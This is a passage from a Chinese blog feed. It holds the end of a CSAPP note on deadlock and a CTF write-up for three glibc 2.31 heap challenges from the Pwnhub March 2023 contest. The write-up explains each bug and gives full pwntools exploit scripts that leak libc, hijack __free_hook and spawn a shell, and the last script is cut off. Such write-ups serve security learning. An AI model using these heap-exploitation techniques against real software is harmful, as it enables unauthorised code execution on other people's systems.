class="headerlink" title="生产者消费者区别和读者写者问题的区别"></a>生产者消费者区别和读者写者问题的区别</h4><p>前者用于数据生成和消费分离的场景,后者适用于读操作和写操作分离的场景.<br>多个读者可以同时读取共享数据.多个生产者不能同时完成生产.<br><a href="https://zhuanlan.zhihu.com/p/161936748">https://zhuanlan.zhihu.com/p/161936748</a></p><h3 id="12-7-5-死锁"><a href="#12-7-5-死锁" class="headerlink" title="12.7.5 死锁"></a>12.7.5 死锁</h3><p>如果每个线程都是以一种顺序获得互斥锁并已相反的顺序释放,那么这个程序就是无死锁的.</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnhub 2023 3月公开赛 WP</title>
      <link href="/2023/03/12/Pwnhub-2023-March-WP/"/>
      <url>/2023/03/12/Pwnhub-2023-March-WP/</url>
      
        <content type="html"><![CDATA[<p>Pwnhub 2023 3月公开赛 WP</p><span id="more"></span><h2 id="sh-v1-1"><a href="#sh-v1-1" class="headerlink" title="sh_v1_1"></a>sh_v1_1</h2><p>glibc2.31堆题<br>一堆莫名其妙的全局变量运算,白看了半天最后发现一点用都没有.<br>恢复一下结构体</p><pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span> file<span class="token punctuation">{</span><span class="token keyword">long</span> flag<span class="token punctuation">;</span><span class="token keyword">char</span> filename<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">char</span><span class="token operator">*</span> content_ptr<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>程序逻辑就是模拟的一个linux终端,输入命令进行相应处理.<br>漏洞在ln的时候可以备份指针造成uaf</p><p>先free两个堆块进tcache,然后uaf部分覆写next指针指向另一个堆块的size域,改成0x421放进unsortedbin泄露libc地址.<br>之后正常打free_hook就行了</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">find_libc</span><span class="token punctuation">(</span>func<span class="token punctuation">,</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token keyword">global</span> libc<span class="token punctuation">,</span>libc_base<span class="token punctuation">,</span>system_addr<span class="token punctuation">,</span>binsh_addr<span class="token punctuation">,</span>realloc_addr<span class="token punctuation">,</span>free_hook_addr<span class="token punctuation">,</span>onegadget<span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> libc <span class="token operator">=</span> finder<span class="token punctuation">(</span>func<span class="token punctuation">,</span>addr<span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> libc_base <span class="token operator">=</span> libc<span class="token punctuation">.</span>libcbase<span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> realloc_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'realloc'</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> system_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> malloc_hook_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> free_hook_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'__free_hook'</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> binsh_addr<span class="token operator">=</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token comment" spellcheck="true"># onegadget = libc.ogg(1)</span><span class="token keyword">def</span> <span class="token function">touch</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>>>>'</span><span class="token punctuation">,</span><span class="token string">'touch '</span><span class="token operator">+</span>file<span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">cp</span><span class="token punctuation">(</span>file1<span class="token punctuation">,</span>file2<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>>>>'</span><span class="token punctuation">,</span><span class="token string">'cp '</span><span class="token operator">+</span>file1<span class="token operator">+</span><span class="token string">' '</span><span class="token operator">+</span>file2<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">gedit</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>>>>'</span><span class="token punctuation">,</span><span class="token string">'gedit '</span><span class="token operator">+</span>file<span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>>>>'</span><span class="token punctuation">,</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">cat</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>>>>'</span><span class="token punctuation">,</span><span class="token string">'cat '</span><span class="token operator">+</span>file<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">rm</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>>>>'</span><span class="token punctuation">,</span><span class="token string">'rm '</span><span class="token operator">+</span>file<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ln</span><span class="token punctuation">(</span>file1<span class="token punctuation">,</span>file2<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>>>>'</span><span class="token punctuation">,</span><span class="token string">'ln '</span><span class="token operator">+</span>file1<span class="token operator">+</span><span class="token string">' '</span><span class="token operator">+</span>file2<span class="token punctuation">)</span>touch<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>touch<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>touch<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>touch<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>touch<span class="token punctuation">(</span><span class="token string">'5'</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>ln<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'1_ln'</span><span class="token punctuation">)</span>ln<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'1_ln2'</span><span class="token punctuation">)</span>ln<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'2_ln'</span><span class="token punctuation">)</span>ln<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'3_ln'</span><span class="token punctuation">)</span>rm<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>rm<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>cat<span class="token punctuation">(</span><span class="token string">'1_ln'</span><span class="token punctuation">)</span>heap_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>b<span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x4b0</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"heap_base is -> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>heap_base<span class="token punctuation">)</span><span class="token punctuation">)</span>gedit<span class="token punctuation">(</span><span class="token string">'1_ln'</span><span class="token punctuation">,</span><span class="token string">'\xa0'</span><span class="token punctuation">)</span>touch<span class="token punctuation">(</span><span class="token string">'6'</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>touch<span class="token punctuation">(</span><span class="token string">'420'</span><span class="token punctuation">,</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x421</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>ln<span class="token punctuation">(</span><span class="token string">'420'</span><span class="token punctuation">,</span><span class="token string">'420_ln'</span><span class="token punctuation">)</span>rm<span class="token punctuation">(</span><span class="token string">'2_ln'</span><span class="token punctuation">)</span>gedit<span class="token punctuation">(</span><span class="token string">'420_ln'</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">16</span><span class="token punctuation">)</span>cat<span class="token punctuation">(</span><span class="token string">'420_ln'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">16</span><span class="token punctuation">)</span>main_arena <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>b<span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">96</span>find_libc<span class="token punctuation">(</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">,</span>main_arena<span class="token number">-0x10</span><span class="token punctuation">)</span>gedit<span class="token punctuation">(</span><span class="token string">'420_ln'</span><span class="token punctuation">,</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x421</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>rm<span class="token punctuation">(</span><span class="token string">'5'</span><span class="token punctuation">)</span>rm<span class="token punctuation">(</span><span class="token string">'1_ln2'</span><span class="token punctuation">)</span>gedit<span class="token punctuation">(</span><span class="token string">'1_ln'</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>free_hook_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>touch<span class="token punctuation">(</span><span class="token string">'HanQi'</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>touch<span class="token punctuation">(</span><span class="token string">'pwn'</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>rm<span class="token punctuation">(</span><span class="token string">'HanQi'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="ttsc"><a href="#ttsc" class="headerlink" title="ttsc"></a>ttsc</h2><p>intro的时候可以泄露栈地址和libc地址.<br>栈地址只要填满buf就可以顺带出来,<br>而libc地址得益于scanf的匹配机制.<br>scanf(“%d”,&amp;v1);时若接收到无法匹配的数据,v1的值将不会被改变.<br>将原始的v1和v2分成高低部分赋给v8,gdb发现是一个_IO_file_jumps的地址<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202303130942054.png"><br>然后是正常的堆操作,edit的时候有个offbyone,overlap打free_hook就行<br>(偶然发现最后直接free掉free_hook那个堆块而不是’/bin/sh’那个也能getshell,不太懂)</p><pre class=" language-python"><code class="language-python">intro<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">'-'</span><span class="token punctuation">,</span><span class="token string">'-'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">16</span><span class="token punctuation">)</span>rbp <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>b<span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'age: '</span><span class="token punctuation">)</span>IO_file_jumps_low <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> IO_file_jumps_low<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> IO_file_jumps_low <span class="token operator">+=</span> <span class="token number">0x100000000</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'high: '</span><span class="token punctuation">)</span>IO_file_jumps_high <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>IO_file_jumps <span class="token operator">=</span> IO_file_jumps_low<span class="token operator">+</span><span class="token punctuation">(</span>IO_file_jumps_high<span class="token operator">&lt;&lt;</span><span class="token number">32</span><span class="token punctuation">)</span>find_libc<span class="token punctuation">(</span><span class="token string">'_IO_file_jumps'</span><span class="token punctuation">,</span>IO_file_jumps<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">,</span>b<span class="token string">'\x71'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span>free_hook_addr<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x38</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="three-edit"><a href="#three-edit" class="headerlink" title="three_edit"></a>three_edit</h2><p>glibc2.31堆题,限制了堆块大小0x50-0x70<br>虽然题目叫three_edit,汇编代码中也确实有一个判断,不过是恒成立的所以可以无限edit.<br>看半天愣是没发现洞在哪,edit的时候没有检查idx的正负<br>(其实是关注了一下的,只不过当时看add函数看到idx是个unsigned int就没管了)</p><p>写入小于0的idx使edit的时候能使用tcache_perthread_struct中的指针完成uaf.<br>部分覆写next指针修改size域放进unsortedbin(调整一下堆块的位置就不用爆破一位了),然后切割unsortedbin中的chunk使得unsortedbin chunk的fd指针和某tcache chunk的next指针重合,再次uaf打io_leak.最后劫持free_hook.</p><pre class=" language-python"><code class="language-python"><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io <span class="token operator">=</span> remote<span class="token punctuation">(</span>url<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token comment" spellcheck="true"># io = process('./'+binary)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> edit<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">61</span><span class="token punctuation">,</span>b<span class="token string">'\x50'</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> add<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> add<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token number">0x421</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> delete<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> add<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> delete<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x70</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0x70</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> delete<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> add<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">0x70</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> edit<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">61</span><span class="token punctuation">,</span>b<span class="token string">'\xa0\x36'</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> add<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> fake_stdout <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token number">0xfbad1800</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> b<span class="token string">'\x00'</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token keyword">try</span><span class="token punctuation">:</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> add<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span>fake_stdout<span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> stdin <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> leak_libc<span class="token punctuation">(</span><span class="token string">'_IO_2_1_stdin_'</span><span class="token punctuation">,</span>stdin<span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token 